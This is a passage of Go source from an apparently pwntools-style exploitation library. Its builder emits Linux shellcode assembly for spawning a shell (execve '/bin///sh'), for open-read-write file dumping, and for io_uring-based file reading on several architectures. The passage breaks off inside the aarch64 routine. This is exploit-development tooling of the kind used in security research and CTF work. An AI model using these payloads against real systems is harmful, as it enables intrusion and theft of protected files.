package gpwntools

import (
	"encoding/binary"
	"fmt"
	"math"
	"strconv"
	"strings"
)

// Shellcraft generates pwntools-style shellcode assembly snippets.
//
// Typical use:
//
//	code := gpwntools.Shellcraft.Sh()
//	payload := gpwntools.MustAsm(code)
var Shellcraft = ShellcraftBuilder{}

// ShellcraftOptions configures shellcraft generation. Empty fields use Context.
type ShellcraftOptions struct {
	// Arch is the target architecture. Supported Linux architectures include
	// amd64, i386, arm, aarch64, mips, mipsel, mips64, and mips64el.
	Arch string
	// OS is the target operating system. It defaults to Context.OS.
	OS string
}

// ShellcraftBuilder carries shellcraft defaults.
type ShellcraftBuilder struct {
	opts ShellcraftOptions
}

// WithOptions returns a copy of the builder with explicit options applied.
func (s ShellcraftBuilder) WithOptions(opts ShellcraftOptions) ShellcraftBuilder {
	if opts.Arch != "" {
		s.opts.Arch = strings.ToLower(strings.TrimSpace(opts.Arch))
	}
	if opts.OS != "" {
		s.opts.OS = normalizeContextOS(opts.OS)
	}
	return s
}

// WithArch returns a copy of the builder for a specific architecture.
func (s ShellcraftBuilder) WithArch(arch string) ShellcraftBuilder {
	s.opts.Arch = strings.ToLower(strings.TrimSpace(arch))
	return s
}

// WithOS returns a copy of the builder for a specific target OS.
func (s ShellcraftBuilder) WithOS(osName string) ShellcraftBuilder {
	s.opts.OS = normalizeContextOS(osName)
	return s
}

// Asm assembles shellcraft output with the builder's arch/OS defaults.
func (s ShellcraftBuilder) Asm(code string) ([]byte, error) {
	arch, osName, err := s.target()
	if err != nil {
		return nil, err
	}
	return AsmWithOptions(code, AsmOptions{Arch: arch, OS: osName})
}

// MustAsm is Asm but panics on assembly errors.
func (s ShellcraftBuilder) MustAsm(code string) []byte {
	out, err := s.Asm(code)
	if err != nil {
		panic(err)
	}
	return out
}

// PushString pushes a NUL-terminated string onto the stack. The stack pointer
// points at the beginning of the string afterwards.
func (s ShellcraftBuilder) PushString(value string) string {
	return mustShellcraft(s.pushString(value))
}

// Syscall emits a raw syscall by name, using the target architecture ABI.
func (s ShellcraftBuilder) Syscall(name string, args ...any) string {
	return mustShellcraft(s.syscall(name, args...))
}

// Sh returns execve("/bin///sh", 0, 0) shellcode.
func (s ShellcraftBuilder) Sh() string {
	return s.Execve("/bin///sh", 0, 0)
}

// Execve emits execve(path, argv, envp). If argv/envp are omitted, they default
// to zero. A path equal to a register name is treated as a pointer; otherwise it
// is pushed as a string literal first.
func (s ShellcraftBuilder) Execve(path string, args ...any) string {
	argv, envp := optionalShellcraftArgs("execve", args, 0, 0)
	return mustShellcraft(s.execve(path, argv, envp))
}

// Open emits open(path, flags, mode). Flags and mode default to zero. A path
// equal to a register name is treated as a pointer; otherwise it is pushed as a
// string literal first.
func (s ShellcraftBuilder) Open(path string, args ...any) string {
	flags, mode := optionalShellcraftArgs("open", args, 0, 0)
	return mustShellcraft(s.open(path, flags, mode))
}

// OpenAt emits openat(dirfd, path, flags, mode). Mode defaults to zero. A path
// equal to a register name is treated as a pointer; otherwise it is pushed as a
// string literal first.
func (s ShellcraftBuilder) OpenAt(dirfd any, path string, args ...any) string {
	flags, mode := optionalShellcraftArgs("openat", args, 0, 0)
	return mustShellcraft(s.openAt(dirfd, path, flags, mode))
}

// Read emits read(fd, buf, count).
func (s ShellcraftBuilder) Read(fd any, buf any, count any) string {
	return mustShellcraft(s.syscall("read", fd, buf, count))
}

// Write emits write(fd, buf, count).
func (s ShellcraftBuilder) Write(fd any, buf any, count any) string {
	return mustShellcraft(s.syscall("write", fd, buf, count))
}

// Sendfile emits sendfile(outFd, inFd, offset, count).
func (s ShellcraftBuilder) Sendfile(outFd any, inFd any, offset any, count any) string {
	return mustShellcraft(s.syscall("sendfile", outFd, inFd, offset, count))
}

// IoUringSetup emits io_uring_setup(entries, params).
func (s ShellcraftBuilder) IoUringSetup(entries any, params any) string {
	return mustShellcraft(s.syscall("io_uring_setup", entries, params))
}

// IOUringSetup is an alias for IoUringSetup.
func (s ShellcraftBuilder) IOUringSetup(entries any, params any) string {
	return s.IoUringSetup(entries, params)
}

// IoUringEnter emits io_uring_enter(fd, toSubmit, minComplete, flags, sig, sigsz).
func (s ShellcraftBuilder) IoUringEnter(fd any, toSubmit any, minComplete any, flags any, sig any, sigsz any) string {
	return mustShellcraft(s.syscall("io_uring_enter", fd, toSubmit, minComplete, flags, sig, sigsz))
}

// IOUringEnter is an alias for IoUringEnter.
func (s ShellcraftBuilder) IOUringEnter(fd any, toSubmit any, minComplete any, flags any, sig any, sigsz any) string {
	return s.IoUringEnter(fd, toSubmit, minComplete, flags, sig, sigsz)
}

// IoUringRegister emits io_uring_register(fd, opcode, arg, nrArgs).
func (s ShellcraftBuilder) IoUringRegister(fd any, opcode any, arg any, nrArgs any) string {
	return mustShellcraft(s.syscall("io_uring_register", fd, opcode, arg, nrArgs))
}

// IOUringRegister is an alias for IoUringRegister.
func (s ShellcraftBuilder) IOUringRegister(fd any, opcode any, arg any, nrArgs any) string {
	return s.IoUringRegister(fd, opcode, arg, nrArgs)
}

// IoUringORW emits Linux io_uring open-read-write shellcode. Size defaults to
// 0x100 bytes. The generated code returns instead of exiting.
func (s ShellcraftBuilder) IoUringORW(path string, size ...int) string {
	n := 0x100
	if len(size) > 1 {
		panic(fmt.Sprintf("shellcraft io_uring orw takes at most 1 optional size, got %d", len(size)))
	}
	if len(size) == 1 {
		n = size[0]
	}
	return mustShellcraft(s.ioUringORW(path, n))
}

// IOUringORW is an alias for IoUringORW.
func (s ShellcraftBuilder) IOUringORW(path string, size ...int) string {
	return s.IoUringORW(path, size...)
}

// Close emits close(fd).
func (s ShellcraftBuilder) Close(fd any) string {
	return mustShellcraft(s.syscall("close", fd))
}

// Dup2 emits dup2(oldfd, newfd).
func (s ShellcraftBuilder) Dup2(oldfd any, newfd any) string {
	return mustShellcraft(s.syscall("dup2", oldfd, newfd))
}

// Mmap emits mmap-like shellcode. On Linux i386, arm, and mips o32 this uses
// mmap2; on amd64, aarch64, and mips64 it uses mmap.
func (s ShellcraftBuilder) Mmap(addr any, length any, prot any, flags any, fd any, offset any) string {
	return mustShellcraft(s.mmap(addr, length, prot, flags, fd, offset))
}

// Mprotect emits mprotect(addr, length, prot).
func (s ShellcraftBuilder) Mprotect(addr any, length any, prot any) string {
	return mustShellcraft(s.syscall("mprotect", addr, length, prot))
}

// Munmap emits munmap(addr, length).
func (s ShellcraftBuilder) Munmap(addr any, length any) string {
	return mustShellcraft(s.syscall("munmap", addr, length))
}

// Exit emits exit(status). Status defaults to zero.
func (s ShellcraftBuilder) Exit(args ...any) string {
	status := any(0)
	if len(args) > 1 {
		panic(fmt.Sprintf("shellcraft exit takes at most 1 optional argument, got %d", len(args)))
	}
	if len(args) == 1 {
		status = args[0]
	}
	return mustShellcraft(s.syscall("exit", status))
}

// ORW emits open-read-write shellcode for reading a file to stdout. Size
// defaults to 0x100 bytes.
func (s ShellcraftBuilder) ORW(path string, size ...int) string {
	n := 0x100
	if len(size) > 1 {
		panic(fmt.Sprintf("shellcraft orw takes at most 1 optional size, got %d", len(size)))
	}
	if len(size) == 1 {
		n = size[0]
	}
	return mustShellcraft(s.orw(path, n))
}

// Cat is an alias for ORW.
func (s ShellcraftBuilder) Cat(path string, size ...int) string {
	return s.ORW(path, size...)
}

func (s ShellcraftBuilder) target() (string, string, error) {
	arch := strings.ToLower(strings.TrimSpace(s.opts.Arch))
	if arch == "" {
		arch = contextArch()
	}
	osName := normalizeContextOS(s.opts.OS)
	if osName == "" {
		osName = contextOS()
	}

	switch canonicalAsmSyscallArch(arch) {
	case "amd64", "i386", "arm", "aarch64", "mips", "mips64":
	default:
		return "", "", fmt.Errorf("unsupported shellcraft arch %q", arch)
	}
	if osName != "linux" {
		return "", "", fmt.Errorf("unsupported shellcraft os %q", osName)
	}
	return arch, osName, nil
}

func (s ShellcraftBuilder) pushString(value string) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}
	return shellcraftPushString(arch, value)
}

func (s ShellcraftBuilder) syscall(name string, args ...any) (string, error) {
	arch, osName, err := s.target()
	if err != nil {
		return "", err
	}
	number, err := asmSyscallNumber(name, arch, osName)
	if err != nil {
		return "", err
	}
	return shellcraftSyscallNumber(arch, number, args...)
}

func (s ShellcraftBuilder) execve(path string, argv any, envp any) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}

	var b strings.Builder
	pathPtr := path
	if !shellcraftIsRegister(path, arch) {
		code, err := shellcraftPushString(arch, path)
		if err != nil {
			return "", err
		}
		b.WriteString(code)
		pathPtr = shellcraftStackPointer(arch)
	}

	code, err := s.syscall("execve", pathPtr, argv, envp)
	if err != nil {
		return "", err
	}
	b.WriteString(code)
	return b.String(), nil
}

func (s ShellcraftBuilder) open(path string, flags any, mode any) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}

	var b strings.Builder
	pathPtr := path
	if !shellcraftIsRegister(path, arch) {
		code, err := shellcraftPushString(arch, path)
		if err != nil {
			return "", err
		}
		b.WriteString(code)
		pathPtr = shellcraftStackPointer(arch)
	}

	code, err := s.openSyscall(pathPtr, flags, mode)
	if err != nil {
		return "", err
	}
	b.WriteString(code)
	return b.String(), nil
}

func (s ShellcraftBuilder) openSyscall(pathPtr string, flags any, mode any) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}
	if canonicalAsmSyscallArch(arch) == "aarch64" {
		return s.syscall("openat", -100, pathPtr, flags, mode)
	}
	return s.syscall("open", pathPtr, flags, mode)
}

func (s ShellcraftBuilder) openAt(dirfd any, path string, flags any, mode any) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}

	var b strings.Builder
	pathPtr := path
	if !shellcraftIsRegister(path, arch) {
		code, err := shellcraftPushString(arch, path)
		if err != nil {
			return "", err
		}
		b.WriteString(code)
		pathPtr = shellcraftStackPointer(arch)
	}

	code, err := s.syscall("openat", dirfd, pathPtr, flags, mode)
	if err != nil {
		return "", err
	}
	b.WriteString(code)
	return b.String(), nil
}

func (s ShellcraftBuilder) mmap(addr any, length any, prot any, flags any, fd any, offset any) (string, error) {
	arch, _, err := s.target()
	if err != nil {
		return "", err
	}
	switch canonicalAsmSyscallArch(arch) {
	case "i386", "arm", "mips":
		return s.syscall("mmap2", addr, length, prot, flags, fd, offset)
	default:
		return s.syscall("mmap", addr, length, prot, flags, fd, offset)
	}
}

func (s ShellcraftBuilder) orw(path string, size int) (string, error) {
	if size < 0 {
		return "", fmt.Errorf("shellcraft orw size must be non-negative, got %d", size)
	}

	arch, _, err := s.target()
	if err != nil {
		return "", err
	}
	sp := shellcraftStackPointer(arch)
	ret := shellcraftReturnRegister(arch)

	openCode, err := s.open(path, 0, 0)
	if err != nil {
		return "", err
	}
	readCode, err := s.syscall("read", ret, sp, size)
	if err != nil {
		return "", err
	}
	writeCode, err := s.syscall("write", 1, sp, ret)
	if err != nil {
		return "", err
	}
	return openCode + readCode + writeCode, nil
}

func (s ShellcraftBuilder) ioUringORW(path string, size int) (string, error) {
	if size < 0 {
		return "", fmt.Errorf("shellcraft io_uring orw size must be non-negative, got %d", size)
	}
	arch, osName, err := s.target()
	if err != nil {
		return "", err
	}
	if osName != "linux" {
		return "", fmt.Errorf("shellcraft io_uring orw currently supports linux only, got %s/%s", osName, arch)
	}

	switch canonicalAsmSyscallArch(arch) {
	case "amd64":
		return shellcraftIoUringORWAmd64(path, size), nil
	case "i386":
		return shellcraftIoUringORWI386(path, size), nil
	case "arm":
		return shellcraftIoUringORWARM(path, size), nil
	case "aarch64":
		return shellcraftIoUringORWAArch64(path, size), nil
	case "mips":
		return shellcraftIoUringORWMIPS(arch, path, size), nil
	case "mips64":
		return shellcraftIoUringORWMIPS64(path, size), nil
	default:
		return "", fmt.Errorf("shellcraft io_uring orw currently supports linux/amd64, linux/i386, linux/arm, linux/aarch64, linux/mips, linux/mipsel, linux/mips64, and linux/mips64el, got %s/%s", osName, arch)
	}
}

func shellcraftIoUringORWAmd64(path string, size int) string {
	return fmt.Sprintf(`
		lea rbx, [rip + params]
		mov edi, 8
		mov rsi, rbx
		mov eax, SYS_io_uring_setup
		syscall
		test rax, rax
		js fail
		mov r15, rax

		mov esi, dword ptr [rbx + 64]
		mov eax, dword ptr [rbx + 0]
		lea esi, [rsi + rax * 4]
		mov edx, dword ptr [rbx + 100]
		mov eax, dword ptr [rbx + 4]
		shl eax, 4
		add edx, eax
		mov eax, dword ptr [rbx + 20]
		test eax, %#x
		jz mmap_sq_ring
		cmp esi, edx
		cmovb esi, edx

	mmap_sq_ring:
		xor edi, edi
		mov edx, 3
		mov r10d, 0x8001
		mov r8, r15
		xor r9d, r9d
		mov eax, SYS_mmap
		syscall
		test rax, rax
		js fail
		mov r14, rax

		mov eax, dword ptr [rbx + 20]
		test eax, %#x
		jz mmap_cq_ring
		mov r13, r14
		jmp mmap_sqes

	mmap_cq_ring:
		mov esi, dword ptr [rbx + 100]
		mov eax, dword ptr [rbx + 4]
		shl eax, 4
		add esi, eax
		xor edi, edi
		mov edx, 3
		mov r10d, 0x8001
		mov r8, r15
		mov r9d, %#x
		mov eax, SYS_mmap
		syscall
		test rax, rax
		js fail
		mov r13, rax

	mmap_sqes:
		mov eax, dword ptr [rbx + 0]
		shl eax, 6
		mov esi, eax
		xor edi, edi
		mov edx, 3
		mov r10d, 0x8001
		mov r8, r15
		mov r9d, %#x
		mov eax, SYS_mmap
		syscall
		test rax, rax
		js fail
		mov r12, rax

		call prepare_sqe
		mov byte ptr [rdi + 0], %#x
		mov dword ptr [rdi + 4], -100
		lea rax, [rip + path]
		mov qword ptr [rdi + 16], rax
		mov qword ptr [rdi + 32], 1
		call submit_and_wait
		test rax, rax
		js fail
		mov dword ptr [rip + file_fd], eax

		call prepare_sqe
		mov byte ptr [rdi + 0], %#x
		mov eax, dword ptr [rip + file_fd]
		mov dword ptr [rdi + 4], eax
		lea rax, [rip + buf]
		mov qword ptr [rdi + 16], rax
		mov dword ptr [rdi + 24], %#x
		mov qword ptr [rdi + 32], 2
		call submit_and_wait
		test rax, rax
		js fail
		mov dword ptr [rip + read_len], eax

		call prepare_sqe
		mov byte ptr [rdi + 0], %#x
		mov dword ptr [rdi + 4], 1
		lea rax, [rip + buf]
		mov qword ptr [rdi + 16], rax
		mov eax, dword ptr [rip + read_len]
		mov dword ptr [rdi + 24], eax
		mov qword ptr [rdi + 32], 3
		call submit_and_wait
		ret

	fail:
		mov edi, 1
		lea rsi, [rip + fail_msg]
		mov edx, fail_msg_end - fail_msg
		mov eax, SYS_write
		syscall
		mov rax, -1
		ret

	prepare_sqe:
		mov edx, dword ptr [rbx + 44]
		lea r10, [r14 + rdx]
		mov ecx, dword ptr [r10]
		mov edx, dword ptr [rbx + 48]
		mov edx, dword ptr [r14 + rdx]
		mov eax, ecx
		and eax, edx
		mov edx, dword ptr [rbx + 64]
		lea r11, [r14 + rdx]
		mov dword ptr [r11 + rax * 4], eax
		inc ecx
		mov dword ptr [r10], ecx
		shl rax, 6
		lea rdi, [r12 + rax]
		xor eax, eax
		mov qword ptr [rdi + 0], rax
		mov qword ptr [rdi + 8], rax
		mov qword ptr [rdi + 16], rax
		mov qword ptr [rdi + 24], rax
		mov qword ptr [rdi + 32], rax
		mov qword ptr [rdi + 40], rax
		mov qword ptr [rdi + 48], rax
		mov qword ptr [rdi + 56], rax
		ret

	submit_and_wait:
		mov rdi, r15
		mov esi, 1
		mov edx, 1
		mov r10d, %#x
		xor r8d, r8d
		xor r9d, r9d
		mov eax, SYS_io_uring_enter
		syscall
		test rax, rax
		js fail
		mov edx, dword ptr [rbx + 80]
		lea r10, [r13 + rdx]
		mov ecx, dword ptr [r10]
		mov edx, dword ptr [rbx + 88]
		mov edx, dword ptr [r13 + rdx]
		mov eax, ecx
		and eax, edx
		mov edx, dword ptr [rbx + 100]
		lea r11, [r13 + rdx]
		shl rax, 4
		movsxd rax, dword ptr [r11 + rax + 8]
		inc ecx
		mov dword ptr [r10], ecx
		ret

	file_fd:
		.long 0
	read_len:
		.long 0
	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	buf:
		.zero %#x
	`,
		IORING_FEAT_SINGLE_MMAP,
		IORING_FEAT_SINGLE_MMAP,
		IORING_OFF_CQ_RING,
		IORING_OFF_SQES,
		IORING_OP_OPENAT,
		IORING_OP_READ,
		size,
		IORING_OP_WRITE,
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftIoUringORWI386(path string, size int) string {
	return fmt.Sprintf(`
		call base_anchor
	base_anchor:
		pop ebp
		lea ecx, [ebp + params - base_anchor]
		mov ebx, 8
		mov eax, SYS_io_uring_setup
		int 0x80
		test eax, eax
		js fail
		mov dword ptr [ebp + ring_fd - base_anchor], eax

		mov esi, dword ptr [ebp + params + 64 - base_anchor]
		mov eax, dword ptr [ebp + params - base_anchor]
		lea esi, [esi + eax * 4]
		mov edx, dword ptr [ebp + params + 100 - base_anchor]
		mov eax, dword ptr [ebp + params + 4 - base_anchor]
		shl eax, 4
		add edx, eax
		mov eax, dword ptr [ebp + params + 20 - base_anchor]
		test eax, %#x
		jz mmap_sq_ring
		cmp esi, edx
		jae mmap_sq_ring
		mov esi, edx

	mmap_sq_ring:
		xor ebx, ebx
		mov ecx, esi
		mov edx, 3
		mov esi, 0x8001
		mov edi, dword ptr [ebp + ring_fd - base_anchor]
		push ebp
		xor ebp, ebp
		mov eax, SYS_mmap2
		int 0x80
		pop ebp
		test eax, eax
		js fail
		mov dword ptr [ebp + sq_ring - base_anchor], eax

		mov edx, dword ptr [ebp + params + 20 - base_anchor]
		test edx, %#x
		jz mmap_cq_ring
		mov dword ptr [ebp + cq_ring - base_anchor], eax
		jmp mmap_sqes

	mmap_cq_ring:
		mov ecx, dword ptr [ebp + params + 100 - base_anchor]
		mov eax, dword ptr [ebp + params + 4 - base_anchor]
		shl eax, 4
		add ecx, eax
		xor ebx, ebx
		mov edx, 3
		mov esi, 0x8001
		mov edi, dword ptr [ebp + ring_fd - base_anchor]
		push ebp
		mov ebp, %#x
		mov eax, SYS_mmap2
		int 0x80
		pop ebp
		test eax, eax
		js fail
		mov dword ptr [ebp + cq_ring - base_anchor], eax

	mmap_sqes:
		mov ecx, dword ptr [ebp + params - base_anchor]
		shl ecx, 6
		xor ebx, ebx
		mov edx, 3
		mov esi, 0x8001
		mov edi, dword ptr [ebp + ring_fd - base_anchor]
		push ebp
		mov ebp, %#x
		mov eax, SYS_mmap2
		int 0x80
		pop ebp
		test eax, eax
		js fail
		mov dword ptr [ebp + sqes - base_anchor], eax

		call prepare_sqe
		mov byte ptr [edi + 0], %#x
		mov dword ptr [edi + 4], -100
		lea eax, [ebp + path - base_anchor]
		mov dword ptr [edi + 16], eax
		mov dword ptr [edi + 32], 1
		call submit_and_wait
		test eax, eax
		js fail
		mov dword ptr [ebp + file_fd - base_anchor], eax

		call prepare_sqe
		mov byte ptr [edi + 0], %#x
		mov eax, dword ptr [ebp + file_fd - base_anchor]
		mov dword ptr [edi + 4], eax
		lea eax, [ebp + buf - base_anchor]
		mov dword ptr [edi + 16], eax
		mov dword ptr [edi + 24], %#x
		mov dword ptr [edi + 32], 2
		call submit_and_wait
		test eax, eax
		js fail
		mov dword ptr [ebp + read_len - base_anchor], eax

		call prepare_sqe
		mov byte ptr [edi + 0], %#x
		mov dword ptr [edi + 4], 1
		lea eax, [ebp + buf - base_anchor]
		mov dword ptr [edi + 16], eax
		mov eax, dword ptr [ebp + read_len - base_anchor]
		mov dword ptr [edi + 24], eax
		mov dword ptr [edi + 32], 3
		call submit_and_wait
		ret

	fail:
		mov ebx, 1
		lea ecx, [ebp + fail_msg - base_anchor]
		mov edx, fail_msg_end - fail_msg
		mov eax, SYS_write
		int 0x80
		mov eax, -1
		ret

	prepare_sqe:
		mov esi, dword ptr [ebp + sq_ring - base_anchor]
		mov edx, dword ptr [ebp + params + 44 - base_anchor]
		lea ebx, [esi + edx]
		mov ecx, dword ptr [ebx]
		mov edx, dword ptr [ebp + params + 48 - base_anchor]
		mov edx, dword ptr [esi + edx]
		mov eax, ecx
		and eax, edx
		mov edx, dword ptr [ebp + params + 64 - base_anchor]
		lea edi, [esi + edx]
		mov dword ptr [edi + eax * 4], eax
		inc ecx
		mov dword ptr [ebx], ecx
		shl eax, 6
		mov edi, dword ptr [ebp + sqes - base_anchor]
		add edi, eax
		xor eax, eax
		mov dword ptr [edi + 0], eax
		mov dword ptr [edi + 4], eax
		mov dword ptr [edi + 8], eax
		mov dword ptr [edi + 12], eax
		mov dword ptr [edi + 16], eax
		mov dword ptr [edi + 20], eax
		mov dword ptr [edi + 24], eax
		mov dword ptr [edi + 28], eax
		mov dword ptr [edi + 32], eax
		mov dword ptr [edi + 36], eax
		mov dword ptr [edi + 40], eax
		mov dword ptr [edi + 44], eax
		mov dword ptr [edi + 48], eax
		mov dword ptr [edi + 52], eax
		mov dword ptr [edi + 56], eax
		mov dword ptr [edi + 60], eax
		ret

	submit_and_wait:
		mov ebx, dword ptr [ebp + ring_fd - base_anchor]
		mov ecx, 1
		mov edx, 1
		mov esi, %#x
		xor edi, edi
		push ebp
		xor ebp, ebp
		mov eax, SYS_io_uring_enter
		int 0x80
		pop ebp
		test eax, eax
		js fail
		mov esi, dword ptr [ebp + cq_ring - base_anchor]
		mov edx, dword ptr [ebp + params + 80 - base_anchor]
		lea ebx, [esi + edx]
		mov ecx, dword ptr [ebx]
		mov edx, dword ptr [ebp + params + 88 - base_anchor]
		mov edx, dword ptr [esi + edx]
		mov eax, ecx
		and eax, edx
		mov edx, dword ptr [ebp + params + 100 - base_anchor]
		lea edi, [esi + edx]
		shl eax, 4
		mov eax, dword ptr [edi + eax + 8]
		inc ecx
		mov dword ptr [ebx], ecx
		ret

	ring_fd:
		.long 0
	sq_ring:
		.long 0
	cq_ring:
		.long 0
	sqes:
		.long 0
	file_fd:
		.long 0
	read_len:
		.long 0
	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	buf:
		.zero %#x
	`,
		IORING_FEAT_SINGLE_MMAP,
		IORING_FEAT_SINGLE_MMAP,
		IORING_OFF_CQ_RING>>12,
		IORING_OFF_SQES>>12,
		IORING_OP_OPENAT,
		IORING_OP_READ,
		size,
		IORING_OP_WRITE,
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftIoUringORWARM(path string, size int) string {
	var cqOff, sqesOff, readSize strings.Builder
	shellcraftLoadARMImmediate(&cqOff, "r5", uint32(IORING_OFF_CQ_RING>>12))
	shellcraftLoadARMImmediate(&sqesOff, "r5", uint32(IORING_OFF_SQES>>12))
	shellcraftLoadARMImmediate(&readSize, "r1", uint32(size))

	return fmt.Sprintf(`
		mov r12, lr
		adr r10, params
		mov r0, #8
		mov r1, r10
		movw r7, #SYS_io_uring_setup
		svc 0
		cmp r0, #0
		blt fail
		mov r9, r0

		ldr r1, [r10, #64]
		ldr r0, [r10, #0]
		add r1, r1, r0, lsl #2
		ldr r2, [r10, #100]
		ldr r0, [r10, #4]
		add r2, r2, r0, lsl #4
		ldr r0, [r10, #20]
		tst r0, #%#x
		beq mmap_sq_ring
		cmp r1, r2
		movlo r1, r2

	mmap_sq_ring:
		mov r0, #0
		mov r2, #3
		movw r3, #0x8001
		mov r4, r9
		mov r5, #0
		movw r7, #SYS_mmap2
		svc 0
		cmp r0, #0
		blt fail
		mov r8, r0

		ldr r0, [r10, #20]
		tst r0, #%#x
		beq mmap_cq_ring
		mov r11, r8
		b mmap_sqes

	mmap_cq_ring:
		ldr r1, [r10, #100]
		ldr r0, [r10, #4]
		add r1, r1, r0, lsl #4
		mov r0, #0
		mov r2, #3
		movw r3, #0x8001
		mov r4, r9
%s		movw r7, #SYS_mmap2
		svc 0
		cmp r0, #0
		blt fail
		mov r11, r0

	mmap_sqes:
		ldr r1, [r10, #0]
		lsl r1, r1, #6
		mov r0, #0
		mov r2, #3
		movw r3, #0x8001
		mov r4, r9
%s		movw r7, #SYS_mmap2
		svc 0
		cmp r0, #0
		blt fail
		mov r6, r0

		bl prepare_sqe
		mov r1, #%#x
		strb r1, [r0]
		mvn r1, #99
		str r1, [r0, #4]
		adr r1, path
		str r1, [r0, #16]
		mov r1, #1
		str r1, [r0, #32]
		bl submit_and_wait
		cmp r0, #0
		blt fail
		adr r1, file_fd
		str r0, [r1]

		bl prepare_sqe
		mov r1, #%#x
		strb r1, [r0]
		adr r1, file_fd
		ldr r1, [r1]
		str r1, [r0, #4]
		adr r1, buf
		str r1, [r0, #16]
%s		str r1, [r0, #24]
		mov r1, #2
		str r1, [r0, #32]
		bl submit_and_wait
		cmp r0, #0
		blt fail
		adr r1, read_len
		str r0, [r1]

		bl prepare_sqe
		mov r1, #%#x
		strb r1, [r0]
		mov r1, #1
		str r1, [r0, #4]
		adr r1, buf
		str r1, [r0, #16]
		adr r1, read_len
		ldr r1, [r1]
		str r1, [r0, #24]
		mov r1, #3
		str r1, [r0, #32]
		bl submit_and_wait
		bx r12

	fail:
		mov r0, #1
		adr r1, fail_msg
		mov r2, #%#x
		movw r7, #SYS_write
		svc 0
		mvn r0, #0
		bx r12

	prepare_sqe:
		ldr r2, [r10, #44]
		add r4, r8, r2
		ldr r3, [r4]
		ldr r2, [r10, #48]
		ldr r2, [r8, r2]
		and r0, r3, r2
		ldr r2, [r10, #64]
		add r5, r8, r2
		str r0, [r5, r0, lsl #2]
		add r3, r3, #1
		str r3, [r4]
		lsl r0, r0, #6
		add r0, r6, r0
		mov r1, #0
		str r1, [r0, #0]
		str r1, [r0, #4]
		str r1, [r0, #8]
		str r1, [r0, #12]
		str r1, [r0, #16]
		str r1, [r0, #20]
		str r1, [r0, #24]
		str r1, [r0, #28]
		str r1, [r0, #32]
		str r1, [r0, #36]
		str r1, [r0, #40]
		str r1, [r0, #44]
		str r1, [r0, #48]
		str r1, [r0, #52]
		str r1, [r0, #56]
		str r1, [r0, #60]
		bx lr

	submit_and_wait:
		mov r0, r9
		mov r1, #1
		mov r2, #1
		mov r3, #%#x
		mov r4, #0
		mov r5, #0
		movw r7, #SYS_io_uring_enter
		svc 0
		cmp r0, #0
		blt fail
		ldr r2, [r10, #80]
		add r4, r11, r2
		ldr r3, [r4]
		ldr r2, [r10, #88]
		ldr r2, [r11, r2]
		and r0, r3, r2
		ldr r2, [r10, #100]
		add r5, r11, r2
		add r5, r5, r0, lsl #4
		ldr r0, [r5, #8]
		add r3, r3, #1
		str r3, [r4]
		bx lr

	file_fd:
		.word 0
	read_len:
		.word 0
	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	buf:
		.zero %#x
	`,
		IORING_FEAT_SINGLE_MMAP,
		IORING_FEAT_SINGLE_MMAP,
		cqOff.String(),
		sqesOff.String(),
		IORING_OP_OPENAT,
		IORING_OP_READ,
		readSize.String(),
		IORING_OP_WRITE,
		len("io_uring failed\n"),
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftIoUringORWAArch64(path string, size int) string {
	return fmt.Sprintf(`
		mov x28, x30
		adr x19, params
		mov x0, #8
		mov x1, x19
		mov x8, #SYS_io_uring_setup
		svc #0
		tbnz x0, #63, fail
		mov x20, x0

		ldr w1, [x19, #64]
		ldr w0, [x19, #0]
		add w1, w1, w0, lsl #2
		ldr w2, [x19, #100]
		ldr w0, [x19, #4]
		add w2, w2, w0, lsl #4
		ldr w0, [x19, #20]
		tbz w0, #0, mmap_sq_ring
		cmp w1, w2
		csel w1, w2, w1, lo

	mmap_sq_ring:
		mov x0, xzr
		mov x2, #3
		mov x3, #0x8001
		mov x4, x20
		mov x5, xzr
		mov x8, #SYS_mmap
		svc #0
		tbnz x0, #63, fail
		mov x21, x0

		ldr w0, [x19, #20]
		tbz w0, #0, mmap_cq_ring
		mov x22, x21
		b mmap_sqes

	mmap_cq_ring:
		ldr w1, [x19, #100]
		ldr w0, [x19, #4]
		add w1, w1, w0, lsl #4
		mov x0, xzr
		mov x2, #3
		mov x3, #0x8001
		mov x4, x20
		mov x5, %#x
		mov x8, #SYS_mmap
		svc #0
		tbnz x0, #63, fail
		mov x22, x0

	mmap_sqes:
		ldr w1, [x19, #0]
		lsl w1, w1, #6
		mov x0, xzr
		mov x2, #3
		mov x3, #0x8001
		mov x4, x20
		mov x5, %#x
		mov x8, #SYS_mmap
		svc #0
		tbnz x0, #63, fail
		mov x23, x0

		bl prepare_sqe
		mov w1, #%#x
		strb w1, [x0]
		mov w1, #-100
		str w1, [x0, #4]
		adr x1, path
		str x1, [x0, #16]
		mov x1, #1
		str x1, [x0, #32]
		bl submit_and_wait
		tbnz x0, #63, fail
		adr x1, file_fd
		str w0, [x1]

		bl prepare_sqe
		mov w1, #%#x
		strb w1, [x0]
		adr x1, file_fd
		ldr w1, [x1]
		str w1, [x0, #4]
		adr x1, buf
		str x1, [x0, #16]
		mov w1, #%#x
		str w1, [x0, #24]
		mov x1, #2
		str x1, [x0, #32]
		bl submit_and_wait
		tbnz x0, #63, fail
		adr x1, read_len
		str w0, [x1]

		bl prepare_sqe
		mov w1, #%#x
		strb w1, [x0]
		mov w1, #1
		str w1, [x0, #4]
		adr x1, buf
		str x1, [x0, #16]
		adr x1, read_len
		ldr w1, [x1]
		str w1, [x0, #24]
		mov x1, #3
		str x1, [x0, #32]
		bl submit_and_wait
		br x28

	fail:
		mov x0, #1
		adr x1, fail_msg
		mov x2, fail_msg_end - fail_msg
		mov x8, #SYS_write
		svc #0
		mov x0, #-1
		br x28

	prepare_sqe:
		ldr w2, [x19, #44]
